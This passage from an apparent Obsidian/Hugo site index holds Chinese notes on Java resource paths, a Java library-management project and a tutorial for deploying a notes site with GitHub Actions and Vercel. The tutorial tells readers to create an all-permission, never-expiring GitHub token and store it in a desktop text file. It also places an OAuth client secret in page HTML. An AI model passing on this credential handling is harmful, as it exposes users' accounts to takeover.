https://update.glados-config.com/clash/298632/2761528/68154/glados.yaml","lastmodified":"2023-05-31T09:03:33.049907844Z","tags":null},"/%E8%B7%AF%E5%BE%84%E7%9A%84%E7%A7%BB%E6%A4%8D%E6%80%A7%E9%97%AE%E9%A2%98":{"title":"路径的移植性问题","content":"# 路径的移植性问题\n# 路径的移植性问题\n\nCreated: August 9, 2022 2:10 PM\n\n## 文件路径的移植性问题：根据src获取文件的绝对路径\n\n关键语句\n\n获取路径： `String path=Thread.currentThread().getContextClassLoader().getResource(\"com/reflect/t1/test.txt\").getPath();`\n\n流的方式返回（方便获取配置文件）：`InputStream reader=Thread.*currentThread*().getContextClassLoader().getResourceAsStream(\"peizhi.properties\");`\n\n比如是在**类根文件夹下的文件才可以（src目录会复制到out的project目录下）**\n\n```java\nimport java.io.InputStream;\nimport java.util.Properties;\n\npublic class Test04 {\n    public static void main(String[] args) throws  Exception {\n        /*\n        * Thread.currendThread() 获取当前线程\n        * getContextClassLoader() 线程对象的方法，获取当前线程的类加载器对象\n        * getResource()           【获取资源】这是类加载器对象的方法，当前线程的类加载器默认从类的根路径下加载资源。\n        * getPath()              获取当前文件的绝对路径\n        * getResourceAsStream 资源以流的方式返回\n        *  */\n        \n        //获取src下的某文件的绝对路径\n        String path=Thread.currentThread().getContextClassLoader().getResource(\"test02.txt\").getPath();\n        System.out.println(path);\n        //通过流的方式返回\n        InputStream reader=Thread.currentThread().getContextClassLoader().getResourceAsStream(\"peizhi.properties\");\n        Properties pro=new Properties();\n        pro.load(reader);\n        System.out.println(pro.getProperty(\"classname\"));\n    }\n}\n```\n\n![Untitled](../../../../assets/Untitled%203.png)\n\n## 文件路径移植性问题：IO+properties通过绑定器解决\n\n### 书写注意点\n\n1. `getBundle`不要在后面的参数中放文件后缀名，**只需要写文件名，不要写后缀名**\n2. 只**适用于`properties`文件类型**\n\n```java\nimport java.util.ResourceBundle;\n\npublic class Test05 {\n    public static void main(String[] args) {\n//设置绑定器\nResourceBundle configFile=ResourceBundle.getBundle(\"com/reflect/test/配置\");\n        String classname=configFile.getString(\"classname\");\n        System.out.println(classname);\n    }\n}\n\n```\n\n![Untitled](../assets/a117811e41614da398f1df48db1450bd.png)","lastmodified":"2023-05-31T09:03:33.049907844Z","tags":null},"/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7":{"title":"软件工具","content":"\n\n- [[pdf阅读器]]：阅读器 [](https://pc.qq.com/detail/17/detail_11317.html)[SumatraPDF](https://wiki.doingnothing.online/#SumatraPDF)\n- [[搜索]]工具： everything\n- [[图片工具]]\n\t- 让图片更清晰：[alibaba/MNN: MNN is a blazing fast, lightweight deep learning framework, battle-tested by business-critical use cases in Alibaba (github.com)](https://github.com/alibaba/MNN)\n- 专业的书籍编写\n\t- manuskript-0.15.0-windows：采用**markdown**进行编写，非常不错，**推荐使用**\n\t- scrivener_193201：有点看不懂的东西，功能和排版都有，但是使用起来不方便\n\t-\n","lastmodified":"2023-05-31T09:03:33.049907844Z","tags":null},"/%E8%BF%87%E6%9D%A5%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E7%BB%8F%E9%AA%8C":{"title":"过来程序员的经验","content":"\n\n在这个行业里，每个人基本上都是自学成才的。对于传统的教育机构来说，科技的发展速度实在是太快了。如果你想快速上手一些东西，你最好自己立刻开始学习，而不是又去教室里听三年的课。\n  \n传统教育在基础研究中仍然占有一席之地。获得学士学位是踏入职场的一种方式，但并不是唯一的方式。如果你的大脑更注重实际，而不是更偏好理论，而且你无法偿还未来10年的助学贷款，那么你可以在现在的互联网上找到更多的学习资源和指导。\n  \n要想进入这个行业，你必须永远保持好奇心。你需要不停地问自己这一切是如何运作的，为什么会这样——尤其是当一切终于有了眉目的时候。\n  \n在很长一段时间内，你可能会觉得自己并没有多少真正的进步——直到你回过头去看自己原来写的旧代码，或者必须向其他人解释一些东西的时候。\n  \n作为初级开发人员，还是要多写写代码才好。学习编程就像学习写作一样。你写得越多，你就越能发现其中的套路、你的短板之所在以及修正它们的方法。\n  \n作为行业新手，一开始你会处于一个自大的阶段，认为自己什么都知道。然后随着你写的代码越来越多，你会发现曾经那个膨胀的自我正在逐渐缩小。然后，当你越来越得心应手、经验也越来越足的时候，你甚至有能力引导那些经验不足的同龄人朝正确的方向前进，但你也会让他们稍微“挣扎”一下，因为这是他们学习和创造过程的一部分。\n  \n漏洞的出现在所难免，发生漏洞是因为知识上的差距。代码在转换成“计算机语言”的时候或多或少总会出点问题，不要慌。当出现漏洞的时候，很可能只是因为“转换过程”中出现了一个小问题。\n  \n当人们告诉你你在做敏捷开发，但不让你参与对此会产生的直接影响计划阶段时，那一定不是真正的敏捷开发。\n  \n作为一名开发人员，你在工作时将长期处于一种不断了解但同时又不怎么了解的状态。\n  \n在可读性方面，格式是决定性因素。\n  \n代码是一种通信工具，一种以一种人类可读的方式编写的通信工具，而不是只有初学者才能理解的密码名。\n  \n面向函数编程模式可以使事情变得不那么复杂。面向对象编程模式在作为组织和分类工具方面也颇为有用。这两种模式并不是相互排斥的，而是在必要时是共存的。\n  \n写代码要稳扎稳打，从长远来看，当前以“最佳实践”为目的的过度取巧可能导致未来有太多的技术短板要补。\n  \n所有的软件迭代都很快。5个月前的“完美”代码可能会由于需","lastmodified":"2023-05-31T09:03:33.049907844Z","tags":null},"/%E9%80%9A%E7%94%A8%E6%A8%A1%E6%9D%BF":{"title":"\u003c% tp.file.title %\u003e","content":"","lastmodified":"2023-05-31T09:03:33.049907844Z","tags":null},"/%E9%83%A8%E7%BD%B2Obsidian%E9%9D%99%E6%80%81%E7%9F%A5%E8%AF%86%E5%BA%93%E7%BD%91%E7%AB%99":{"title":"001-部署Obsidian静态知识库网站","content":"# 部署\n\n## 基本结构\n\n```mermaid\ngraph BT\n\tzck(子模块_笔记仓库)\n\tfckhugo(父仓库hugo分支)\n\tfckmaster(父仓库master分支)--\u003ewz(你vercel部署的网站)\n\tzck.-通过推送workflows+TOKEN推送到.-\u003efckhugo\n\tfckhugo.-通过转换为gitpage的workflows+TOKEN转换到 .-\u003efckmaster\n\t\n\t\n\t\n```\n\n\n\n## 仓库设置以及部署\n\n### 父仓库（用于发布仓库：fork）\n\n1. fork我的的ObPublish仓库，然后使用git工具克隆`clone`到本地。\n\n   ```\n   git clone 你的仓库链接\n   ```\n\n   ![image-20220915232031007](../../assets/63115773e12c4d8c8382c89a90a22ab3.png)\n\n2. 使用`vscode`打开这个仓库，然后在 `设置`--\u003e`查看`--\u003e`终端` 打开终端，可以在此处进行git的基本操作\n\n   1. ![image-20220915230907147](../../assets/5deb2543c08b48f2ba50f0d1836fe3be.png)\n   2. 选择bash终端，这个是专门用来执行git命令的，当然，你也可以用除了shell之外的其他终端![image-20220915231014606](../../assets/1292caa2641e40eb9035556ce8d1720a.png)\n\n3. 查看基本的情况\n\n   ```bash\n   $ git remote -v #查看当前连接的远程仓库\n   origin  https://github.com/tianzhongs/ObPublish.git (fetch)\n   origin  https://github.com/tianzhongs/ObPublish.git (push)\n   \n   22305@□□Ӵ□□ȥ MINGW64 ~/Desktop/ObPublish (hugo)\n   $ git submodule status #查看子模块状态，我的因为已经删除了所有的子模块文件，不会显示\n   \n   ```\n\n   \n\n4. 如果你有子模块仓库（仓库上的content上有@地址，就说明有子模块仓库），你需要采用一下命令对子模块进行删除，删除之后才能连接上你自己的(以下命令需要在bash下使用)\n\n   ```bash\n   rm -rf content     #删除子模块目录及源码 bash下使用\n   vi .gitmodules       #删除项目目录下.gitmodules文件中子模块相关条目 bash下使用\n   vi .git/config       #删除配置项中子模块相关条目 bash下使用\n   rm .git/module/*     #删除模块下的子模块目录，每个子模块对应一个目录，注意只删除对应的子模块目录即可 \n   ```\n\n### 子仓库设置\n\n1. github上新建一个远程仓库，建议勾选 `私有`，添加一个readme文件（可以初始化仓库，减少麻烦）。**此仓库保存你obsidian知识库中的文件，并通过之后设置的工作流推送到父仓库（发布仓库）**![image-20220915232548960](../../assets/3558c002fa044143937d8e90090e87d4.png)\n\n2. 将此仓库克隆到本地\n\n   ```bash\n   git clone 你的仓库链接\n   ```\n\n3. 将此知识库必备文件包**解压后**放到你克隆的仓库中\n\n   [文件包点击可达下载地址](https://www.notion.so/tianzhongs/obsidian-de6a07362b774712b51ec44e12cd344d#166e6c51325148a28330dc8be53b2996)\n\n   所勾选的三个文件或文件夹是必须的目录结构，其中的部分文档和模板可以删除![image-20220915234134787](../../assets/7345a4c268f84017bb8c5f41bdddf1b4.png)\n\n4. 用vscode打开此知识库仓库，通过vscode或git命令进行提交，git命令采用以下进行\n\n   ```bash\n   git add . #添加所有文件到暂存区\n   git commit -m \"提交必备文件\" #提交信息\n   git push #提交到远程仓库\n   ```\n\n### 子模块仓库配置\n\n\u003e 因为笔记仓库和发布仓库是分离的，所以需要将子仓库与父仓库进行关联。将子仓库作为子模块放到父仓库中，作为父仓库的content文件夹\n\n1. 打开父仓库（发布仓库Obpublish），使用git命令\n\n   ```bash\n   git submodule add https://github.com/tianzhongs/ObZhishiku.git content #将仓库作为模块放到父仓库的content文件夹中\n   git submodule update --init #初始化子模块\n   git submodule update --remote #子模块最新的内容版本同步到父仓库\n   ```\n\n   ![image-20220916002216473](../../assets/620be3798203480a8bb1104a3f9684a1.png)\n\n   可以在本地父仓库（发布仓库）中看到多了一个content文件夹，其中包含的就是笔记仓库的内容\n\n2. 将本地的操作同步到github上(**提交三部曲**)\n\n   ```bash\n   git add .\n   git commit -m \"添加子模块\"\n   git push #提交到远程仓库\n   ```\n\n   ![image-20220916002603531](../../assets/3fd9967fdb0a49699c3069a3f3999973.png)\n\n此时，就可以在github父仓库中看到子模块的状态，有个`@`符号，所@的就是子模块的版本号，点击可以进入到对应的子仓库版本号 的内容\n\n## 配置转换工作流文件\n\n在父仓库中，有一个`workflows`文件夹中有一个`deploy.yaml`文件，是github的专属工作流文件，可以在其中部署自己的脚本等等达到自动化。\n\n### 添加TOKEN\n\n1. 打开github，点击头像，在弹出的选项中选择 `settings` ，往下翻，找到`Developer settings`（开发者设置）中，添加一个TOKEN，全部权限都勾选，期限设置永久\n   1. ![image-20220916003405259](../../assets/a7ea49e2ef004740a3ee0e344a6d4cb9.png)\n   2. ![image-20220916003652746](../../assets/86b94d99dbc8484da96aceb641aa8872.png)\n\n2. 复制你的TOKEN，在桌面新建一个txt保存起来，因为之后也需要用到\n\n3. 在github上打开父仓库，点击**仓库的settings**,在下面可以找到添加，将刚才复制的TOKEN添加进去作为一个环境变量，需要注意：名字必须是全大写的`TOKEN`![image-20220916004320660](../../assets/af887239c4d148358196065192740b2d.png)\n\n4. 返回到本地父仓库（发布仓库）的`.github\\workflows\\deploy.yaml`，对工作流进行基本的设置。设置之后，git推送三部曲（add，commit，push到远程仓库）\n\n   ```yaml\n   name: Deploy to GitHub Pages\n   \n   on:\n     push:\n       branches:\n         - hugo\n   \n     workflow_dispatch:\n   \n   jobs:\n     deploy:\n       runs-on: ubuntu-22.04\n       steps:\n         - uses: actions/checkout@v2\n           with: \n             token: ${{ secrets.TOKEN }}  #这里是添加的token，不用设置，需要在仓库中添加TOKEN，$代表的是调用刚才添加的环境变量，所以不需要设置\n             submodules: 'true'\n         - name: Checkout submodules\n           run: git submodule update --init --recursive\n   \n         - name: config1 \n           run: rm -rf content/.obsidian content/cedict_ts.u8 content/Extras/Templates  \u0026\u0026 mv content/*.md content/Atlas \u0026\u0026 find content/ -name \"*.md\" | xargs -I file  mv -f file content \u0026\u0026  mv content/AboutTheGarden.md content/_index.md \n         \n         - name: config2\n           run: \"ls content/ \u0026\u0026 grep -lr --null 'title' content/* | xargs -0 sed -i -E -r 's/title: \"(.*)/title: \\\"\\\\1\\\"/g'\"\"\n         \n         - name: config3 \n           run: rm -rf content/*.md-E\n   \n         \n         - name: Build Link Index\n           uses: jackyzha0/hugo-obsidian@v2.18\n           with:\n             index: true\n             input: content\n             output: assets/indices\n             root: .\n   \n   \n         - name: Setup Hugo\n           uses: peaceiris/actions-hugo@v2\n           with:\n             hugo-version: '0.96.0'\n             extended: true\n   \n         - name: Build\n           run: hugo --minify --debug\n   \n         - name: Deploy\n           uses: peaceiris/actions-gh-pages@v3\n           with:\n             github_token: ${{ secrets.GITHUB_TOKEN }}\n             publish_dir: ./public\n             publish_branch: master  # deploying branch\n             cname: www.baidu.com   #修改成你的域名\n   ```\n\n   \n\n5. 将子模块的再次同步到父仓库一下，在本地父仓库（发布仓库）中执行以下命令（如果没有推送的东西，就打开readme文件，随便加个空格就有改动，可以推送了）\n\n   ```bash\n   git submodule update --init #初始化子模块\n   git submodule update --remote #子模块最新的内容版本同步到父仓库\n   git add .\n   git commit -m \"最新的\"\n   git psuh\n   ```\n\n6. 推送之后，打开github发布的远程仓库ObPublish中的`action`，这里是查看工作流的地方，查看刚才推送的能否成功转换，之前错误的工作流不用管![image-20220916005313382](../../assets/ca7d762b8cb848f78abac63b3368b1ce.png)\n7. 你可以点击github中的code面板，可以选择分支，你会发现多了一个`master`分支，那个就是通过我们的工作流将hugo分支中子模块-我们的笔记content中的内容转换成了html文件放到了master分支中\n\n## Vercel基本部署\n\n1. 打开 [verel](https://vercel.com/)次用github登录之后，选择新建Project（项目），选择import你的发布仓库obPublish\n2. 选择环境是other，即默认没有环境，因为部署的是master分支，里面全是html文件，浏览器能够执行，不需要环境![image-20220916005911016](../../assets/5aa3ce9e1a3744b1ad1f1f0aa8e4d9fd.png)开始部署\n3. 然后成功之后，你会发现主界面是错误，原因是因为vercel默认部署你github仓库中的默认分支，所以需要 **调整部署分支，为master**：在你部署的这个项目中点击settings，选择git，然后设置分支，保存。\n4. ![image-20220916010146988](../../assets/0582c43e24c143f8bef94dcfbc4429fe.png)\n5. 你还需要在本地仓库中修改一下父仓库的readme文件，随便加个空格就行。这样做的原因是：vercel每次进行部署，都建立在你的仓库有改动的情况下，因为没有改动，他就不会部署你的master分支，所以**你在本地父仓库中修改内容，push推送（git推送三部曲）到远程仓库就好**（推送之后你依旧可以到github远程父仓库中的`action`查看工作流的情况，工作流成功之后，verel才会开始拉取github中的master分支，开始部署网站。）![image-20220916010603652](../../assets/5d3414e585364ceabf90db998b2d252d.png)\n6. 可以看到已经部署成功，在vercel也成功的部署了master分支![image-20220916010653216](../../assets/0a628d0a1d034567a78714cd5a4ffcbc.png)\n7. 点击overview面板中的visit进行访问，可以看到部署成功的界面了（搜索功能不能使用，因为父仓库中的`config.toml`文件中没有配置成你的域名，你也可以配置成vercel的项目域名Domains）。![image-20220916010751475](../../assets/47439db397c24febaf36e7791ce31cad.png)\n\n## 配置文件部分\n\n### 域名\n\n1. 打开vercel的`settings`面板，在选择`Domain`，添加你的域名（域名解析方面不赘述），添加之后如图，当然你也可以用vercel自带的项目域名![image-20220916105704328](../../assets/43dd9f1dcda0473bb06d371e728f0aa6.png)\n\n\n\n### 父仓库中的文件配置\n\n`config.toml`：配置baseURl，配置成你的域名，刚才在vercel中设置的或者vercel项目自带生成的（此处域名不改成自己的，无法使用搜索功能）\n\n`data\\config.yaml`：配置一些基本信息\n\n### 设置子模块工作流(用于推送到父模块的hugo分支)\n\n1. 添加TOKEN到action\t\n\n   和之前的步骤一样，在github子模块笔记仓库中的settings中添加刚才的TOKEN进去，名字必须是全部大写\n\n2. 点击仓库才action，在这里可以添加工作流，如果你，如果仓库中有工作流文件，你可以对其进行修改，工作流在.github/workflows文件夹下\n\n3. 开始新建工作流![image-20220916160314431](../../assets/a048e9ddea40414a9e13d14dd95930e4.png)\n\n4. 全部删除，将以下内容复制粘贴进去，然后进行修改配置\n\n   ```yaml\n   name: Send submodule updates to parent repo\n   \n   on:\n     push:\n       branches:\n         - main\n   \n   jobs:\n     update:\n       runs-on: ubuntu-latest\n   \n       steps:\n         - uses: actions/checkout@v2\n           with:\n             repository: zhangsan/dg3 # 设置你用户名/发布仓库的仓库名,作用是将子模块更新到父仓库dg3\n             token: ${{ secrets.TOKEN }}\n             # 把子模块打开\n             submodules: 'true'\n   \n         - name: Pull \u0026 update submodules recursively\n           run: |\n             git submodule update --init --recursive\n             git submodule update --recursive --remote\n         - name: Commit\n           run: |\n             git config user.email \"提交的邮箱，一般是你github的邮箱\" #修改\n             git config user.name \"你的名称\" #修改\n             git add --all\n             git commit -m \"Update submodules\" || echo \"No changes to commit\"\n             git push\n   ```\n\n   5. 提交之后，点击action进行查看![image-20220916161016944](../../assets/6ac0332b42744daebb66a1486a7aad44.png)\n   6. 到这里，在本地笔记仓库中做了修改，就可以直接推送，就不需要到父仓库中进行子模块同步了，工作流会自动在云端同步。\n\n\n\n## 额外评论区设置\n\n预览图\n\n![image-20220916163756206](../../assets/0fe69989b5c640188cba010759373eed.png)\n\n\u003e 为了方便配置，我选择的是gitTalk的方式，开始我使用了`waline`的方式去配置，虽然能够评论，但是不清楚为什么一直加载评论区，所以我就弃用了，waline的界面配置性更高，同时可以无需登录评论。\n\n### gitTalk评论区进行配置\n\n\u003e 因为评论区是和仓库的issue相互连接的，评论区中的内容都会转到仓库issue中，因为笔记仓库私有化，所以相对于评论的可见性，我建议可以自己进行选择。比如我希望别人也能够看见评论，在父仓库发布仓库中进行以下步骤。\n\n注意：**仓库的issue必须打开**，默认是打开的\n\n1. 点击`头像`--\u003e`setting`--\u003e`开发者设置`--\u003e`OAuth Apps`，或者直接点击这个连接进入(开发者设置)[https://github.com/settings/developers]，添加一个应用\n\n2. 设置好你的域名，别的随便设置![image-20220916162639143](../../assets/1f9ef4c6a1c9402da0df9a49f0e5d09a.png)\n\n3. 复制id和密码，![image-20220916162812917](../../assets/4f0d3d6e20444379883616fb601fc4b5.png)\n\n4. 打开本地仓库父仓库的`layouts\\partials\\contact.html`文件，末尾添加以下代码，然后配置id和密码\n\n   ```html\n   \n   \u003c!-- 以下为你需要配置的评论区，以下部分可以删除 --\u003e\n   \u003c!-- 引入 --\u003e\n   \u003clink rel=\"stylesheet\" href=\"https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css\"\u003e\n   \u003cscript src=\"https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js\"\u003e\n       \u003c/script\u003e\n   \n       \u003c!-- 添加一个容器--\u003e\n       \u003cdiv id=\"gitalk-container\"\u003e\u003c/div\u003e\n   \n       \u003c!-- 生成 gitalk 插件--\u003e\n       \u003cscript\u003e\n           var gitalk = new Gitalk({\n               clientID: 'b3de86d5654c36a4a587', //Client ID 自己配置\n   \n               clientSecret: '973b351e5a54ff9ea6d93e7db3f431ueef48dc2d', //Client Secret 自己配置\n   \n               repo: 'blogtalk',//保存评论的仓库仓库名称  自己配置\n               owner: 'gfddgngs',//仓库拥有者  自己配置\n               admin: ['dsdnzhongs'], //仓库管理员\n               id: location.href,      // Ensure uniqueness and length less than 50\n               distractionFreeMode: false  // Facebook-like distraction free mode\n           })\n   \n           gitalk.render('gitalk-container')\n       \u003c/script\u003e\n   ```\n\n   \n\n5. 等vercel拉取部署成功之后\n\n#### gittalk评论Lable问题\n\n\u003e 在我后来使用的过程中，点击除了主页笔记之外的页面，会出现评论区验证错误（Error: Validation Failed.）\n\n在此致谢：[我是东山啊](https://blog.misec.top/archives/2018810gitalk-error#:~:text=Error%3A%20Validation%20Failed%20%E8%BF%99%E4%B8%AA%E9%97%AE%E9%A2%98%E5%B0%B1%E6%AF%94%E8%BE%83%E5%A4%8D%E6%9D%82%E4%BA%86%EF%BC%8C%E9%83%A8%E5%88%86%E6%96%87%E7%AB%A0%E7%9A%84%E8%AF%84%E8%AE%BA%E5%8C%BA%E4%BC%9A%E6%8A%A5Error%3A%20Validation%20Failed%2C%E5%85%B7%E4%BD%93%E5%8E%9F%E5%9B%A0%E6%98%AF%E7%94%B1%E4%BA%8E,Github%20%E9%99%90%E5%88%B6%20labal%20%E9%95%BF%E5%BA%A6%E4%B8%8D%E8%83%BD%E8%B6%85%E8%BF%87%2050%E5%BC%95%E8%B5%B7%E7%9A%84%EF%BC%8C%E8%AF%A5%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%E6%9D%A5%E8%87%AAGitalk%E9%A1%B9%E7%9B%AE%E4%BB%93%20Issues115%EF%BC%8C%E9%80%9A%E8%BF%87MD5%E5%8A%A0%E5%AF%86ID%E6%9D%A5%E7%BC%A9%E7%9F%ADlabal%E9%95%BF%E5%BA%A6%E3%80%82)的博客，已经将修改后的内容放置到了项目之中，可以直接fork进行使用\n\n# 注意事项\n\n1. 笔记仓库中的笔记都有`title`的yaml头，网站部署后的文章标题就是yaml中的title字段，所以title字段是笔记的必须\n2. 如果你已经部署好了相关的文档，那么就可以看一下这篇文章，其中包含了关于这个知识库在Obsidian中的一些格式问题，**尤其需要注意**，点击我[[003-Obsidian知识库笔记相关注意事项]]","lastmodified":"2023-05-31T09:03:33.049907844Z","tags":null},"/%E9%9D%B6%E5%9C%BA":{"title":"靶场","content":"\n- [[upload-labs]]\n- [[pikachu]]","lastmodified":"2023-05-31T09:03:33.049907844Z","tags":null},"/%E9%9F%B3%E4%B9%90%E4%B8%8B%E8%BD%BD":{"title":"音乐下载","content":"\n- [https://tool.liumingye.cn/music/#/search](https://tool.liumingye.cn/music/#/search)","lastmodified":"2023-05-31T09:03:33.05390788Z","tags":null},"/%E9%A1%B9%E7%9B%AE1%E5%9B%BE%E4%B9%A6%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F":{"title":"【项目1】图书管理系统","content":"# 【项目1】图书管理系统\n# 1. 导包\n1. 导入图书管理的包到idea\n2. 选择src目录，设置为source root\n3. 设置编码为gbk，设置jdk为8或者以上\n---\n\n# 2. 初始化用户数据\n## 具体步骤\n1. 将User实现Serializable，添加序列化号\n2. 添加util工具包，添加initdatautil，添加初始化数据的方法\n3. 写出initdata通用方法，以及在主函数main方法中，写入具体的持久化user对象的方法，将对象写入到本地硬盘中，具体代码如下\n4. 注意：**存入本地的对象都需要添加序列号**，常**用的路径可以加入到常量类中**，pathConstant中的user对象存放路径\n\n## 主要代码\n```java\npackage com.bjpowernode.util;  \n  \nimport com.bjpowernode.bean.PathConstant;  \nimport com.bjpowernode.bean.User;  \n  \nimport java.io.File;  \nimport java.io.FileOutputStream;  \nimport java.io.IOException;  \nimport java.io.ObjectOutputStream;  \nimport java.math.BigDecimal;  \nimport java.util.ArrayList;  \nimport java.util.List;  \n  \n/**  \n * 初始化数据  \n *  \n * @author 22305  \n * @date 2022/08/29  \n */public class InitDataUtil {  \n    public static void main(String[] args) {  \n    /* 初始化用户数据 */        List\u003cUser\u003e userList=new ArrayList\u003c\u003e();  \n    //    添加用户数据  \n        userList.add(new User(1, \"张三\", \"正常\", new BigDecimal((\"100\"))));  \n        userList.add(new User(2, \"李四\", \"正常\", new BigDecimal((\"100\"))));  \n        userList.add(new User(3, \"王6\", \"正常\", new BigDecimal((\"100\"))));  \n    //    使用方法持久化到本地  \n        initData(PathConstant.User_Path,userList);  \n    }  \n  \n    /**  \n     * 初始化数据  \n     *  \n     * @param path 路径  \n     * @param list 列表  \n     */  \n    public static void initData(String path, List\u003c?\u003e list) {  \n        // 路径提取  \n        File directory = new File(path.split(\"/\")[0]);  \n        File file = new File(path);// 初始化文件存放路径  \n        ObjectOutputStream oos=null;//对象输出流  \n        //   判断文件夹是否存在  \n        if (!directory.exists()) {  \n            directory.mkdir();  \n        }  \n        //    判断文件是否存在  \n        if (!file.exists()){  \n            try {  \n                file.createNewFile();  \n                oos=new ObjectOutputStream(new FileOutputStream(file));  \n                oos.writeObject(list);//写入对象数据  \n            } catch (IOException e) {  \n                e.printStackTrace();  \n            }finally {  \n                try {  \n                    oos.close();  \n                } catch (IOException e) {  \n                    e.printStackTrace();  \n                }  \n            }  \n        }  \n  \n    }  \n}\n```\n5. 执行一次，将user对象持久化到本地上\n# 3. 用户查询\n## 具体步骤\n\n# 4. 用户添加\n## 步骤\n1. UserDao添加方法void add(User user);\n2. 对其进行实现,添加操作\n\t1. 读取文件中的list对象\n\t2. 如果有list通过最后一个用户，新生成一个用户编号+1\n\t3. 如果没有list，就创建一个空list，放到空list中\n\t4. 放入到list中，然后重新写入到本地硬盘\n3. 在UserService中添加同样的方法，\n4. 在UserServiceImpl中调用此方法\n5. 修改`UserHandleViewCtrl.java`中相关的持久化\n### 代码\n\n相关修改的代码\n\u003e 注意代码顺序，持续化到本地的代码在前，因为这个项目的数据来源在本地，所以以本地数据为主\n```java\nuserService.add(user);  \nusers.add(user);\n```\n\ndao层实现代码\n```java\npackage com.bjpowernode.dao.Impl;  \n  \nimport com.bjpowernode.bean.PathConstant;  \nimport com.bjpowernode.bean.User;  \nimport com.bjpowernode.dao.UserDao;  \n  \nimport java.io.*;  \nimport java.util.ArrayList;  \nimport java.util.List;  \n  \npublic class UserDaoImpl implements UserDao {  \n    /**  \n     * 选择  \n     *  \n     * @return {@link List}\u003c{@link User}\u003e  \n     */    @Override  \n    public List\u003cUser\u003e select() {  \n        try (ObjectInputStream ois = new ObjectInputStream(new FileInputStream(PathConstant.User_Path))) {  \n            //    读取  \n            List\u003cUser\u003e list = (List\u003cUser\u003e) ois.readObject();  \n            return list;  \n        } catch (Exception e) {  \n            // throw new RuntimeException(e);  \n            e.printStackTrace();  \n        }  \n        // 如果异常，就返回一个无用户对象的空列表  \n        return new ArrayList\u003c\u003e();  \n    }  \n  \n    /**  \n     * 添加  \n     *  \n     * @param user 用户  \n     */  \n    @Override  \n    public void add(User user) {  \n        ObjectInputStream ois = null;  \n        ObjectOutputStream oos = null;  \n        List\u003cUser\u003e list = null;  \n        try {  \n            //    读取硬盘中的用户信息  \n            ois = new ObjectInputStream(new FileInputStream(PathConstant.User_Path));  \n  \n            list = (List\u003cUser\u003e) ois.readObject();// 读取用户信息  \n            // 判断list是否有  \n            if (list != null) {  \n                // 设置新添加的用户id  \n                User lastUser = list.get(list.size() - 1);  \n                user.setId(lastUser.getId() + 1);  \n                //    添加到list中  \n                list.add(user);  \n            } else {  \n                //    当list为空的时候，就需要一个空的去装  \n                list = new ArrayList\u003c\u003e();  \n                user.setId(0001);  \n                list.add(user);  \n  \n            }  \n            //    持久化到本地硬盘  \n            oos = new ObjectOutputStream(new FileOutputStream(PathConstant.User_Path));  \n  \n            oos.writeObject(list);  \n            oos.flush();  \n  \n        } catch (Exception e) {  \n            throw new RuntimeException(\"添加用户失败\");  \n        } finally {  \n            // 释放资源  \n            try {  \n                if (ois != null) {  \n                    ois.close();  \n                }  \n                if (oos != null) {  \n                    oos.close();  \n                }  \n            } catch (IOException e) {  \n                e.printStackTrace();  \n            }  \n        }  \n    }  \n}\n```\n## 问题\n#问题 因为private UserService的时候没有new一个对象出来，导致了使用UserServiceImpl中的方法出错\n![](Pasted%20image%2020220824112043.png)\n#问题 那个`ObjectOutputStream`放在`ObjectInputStream`下面就不行，不太理解为啥一定要放在最后面，是文件读取太快，那时候还在读，但是又打开了问完文件写入流的原因吗？\n\n### 结构\n因为需要层次话，所以需要在service和dao包中分别书写结果，**dao包用于持久化处理数据**，service用于**业务处理**\n```mermaid\ngraph TD\nid1(userService)\nid2(UserDao)\n\n需要使用的类--new--\u003eid1\nUserDaoImpl -.implement.-\u003eid2\nuserServiceImpl-.implement.-\u003eid1\nid1--调用--\u003eid2\n\n```\n1. 新建一个dao包，在dao包下新建接口UserDao，`List\u003cUser\u003e select()`\n2. dao包下创建子包ipml,在ipml下创玩UserDaoIpml类\n3. 在类下重写`List\u003cUser\u003e select()`方法，读取本地的硬盘对象文件，如果没有，就返回空的列表\n4. 在service下新建UserService接口，List\u003cUser\u003e select() 方法\n5. 在impl下新建实现类，UserServiceImpl，调用手写的\n\n\u003e总结一下：\n\u003e1. dao包括了一个接口，以及其下面的实现类，类中主要写了具体的实现方法\n\u003e2. Service主要包括了一个客户端调用的接口，其下面包括的实现类，主要通过new dao类的对象，返回dao下面的实现类\n\u003e3. 主要程序中方法，通过new service实现类，去实现service中的方法\n\u003e主要程序---调用---\u003esevice接口 --实现--\u003eserviceimpl类----调用---\u003edao接口---实现的---\u003edao实现\n\n### 主要代码\ndao层实现的方法\n\n```java\npackage com.bjpowernode.dao.Impl;  \nimport com.bjpowernode.bean.PathConstant;  \nimport com.bjpowernode.bean.User;  \nimport com.bjpowernode.dao.UserDao;  \nimport java.io.FileInputStream;  \nimport java.io.FileNotFoundException;  \nimport java.io.IOException;  \nimport java.io.ObjectInputStream;  \nimport java.util.ArrayList;  \nimport java.util.List;  \npublic class UserDaoImpl implements UserDao {  \n    /**  \n     * 选择  \n     *  \n     * @return {@link List}\u003c{@link User}\u003e  \n     */    @Override  \n    public List\u003cUser\u003e select() {  \n        try (ObjectInputStream ois=new ObjectInputStream(new FileInputStream(PathConstant.User_Path))){  \n        //    读取  \n            List\u003cUser\u003e list=(List\u003cUser\u003e) ois.readObject();  \n            return list;  \n        }catch (Exception e){  \n            // throw new RuntimeException(e);  \n            e.printStackTrace();  \n        }  \n        //如果异常，就返回一个无用户对象的空列表  \n        return new ArrayList\u003c\u003e();  \n    }  \n}\n```\n\n\n调用的地方（需要注意，实现对象和创建对应实现方法的对象）\n```java\n@Override  \npublic void initialize(URL location, ResourceBundle resources) {  \n  \n    /* users.add(new User(1, \"张三\", \"正常\", new BigDecimal((\"100\"))));  \n    users.add(new User(2, \"李四\", \"正常\", new BigDecimal((\"100\"))));  \n    users.add(new User(3, \"王五\", \"正常\", new BigDecimal((\"100\")))); */  \n    //改为本地读取数据加载用户信息  \n    users.addAll(userService.select());  \n  \n    c1.setCellValueFactory(new PropertyValueFactory\u003c\u003e(\"id\"));  \n    c2.setCellValueFactory(new PropertyValueFactory\u003c\u003e(\"name\"));  \n    c3.setCellValueFactory(new PropertyValueFactory\u003c\u003e(\"money\"));  \n    c4.setCellValueFactory(new 